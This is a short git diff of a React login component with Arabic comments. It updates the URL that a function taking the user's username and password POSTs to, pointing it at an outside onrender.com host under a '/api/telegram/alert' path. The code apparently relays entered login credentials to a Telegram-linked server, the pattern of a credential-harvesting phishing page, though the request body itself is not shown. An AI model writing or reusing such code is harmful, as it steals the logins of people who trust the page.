@@ -53,11 +53,11 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى Render
+  // 🔐 دالة إرسال التنبيه إلى Render (رابط صحيح)
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     try {
-      await fetch('https://mwqaa-jhz-main.onrender.com/api/telegram/alert', {
+      await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
